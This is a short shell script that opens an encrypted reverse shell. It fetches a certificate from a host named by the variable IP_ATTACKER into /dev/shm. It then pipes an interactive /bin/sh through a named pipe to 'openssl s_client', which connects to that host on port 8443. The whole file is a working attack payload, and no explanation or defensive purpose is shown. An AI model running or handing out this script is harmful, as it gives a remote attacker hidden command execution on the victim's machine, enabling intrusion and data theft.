#!/bin/sh

#IP_ATTACKER=$(ip a | grep 'inet ' | grep -v '127.0.0.1' | head -n 1 | cut -d' ' -f6 | sed 's/\/.*//g')
IP_ATTACKER="127.0.0.1"
OPENSSL_PATH=$(which openssl)

wget --no-check-certificate https://${IP_ATTACKER}:443/keys/cert2.crt -O /dev/shm/cert.pem

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ${OPENSSL_PATH} s_client -quiet -CAfile /dev/shm/cert.pem -verify_return_error -verify 1 -connect ${IP_ATTACKER}:8443 > /tmp/s; rm /tmp/s
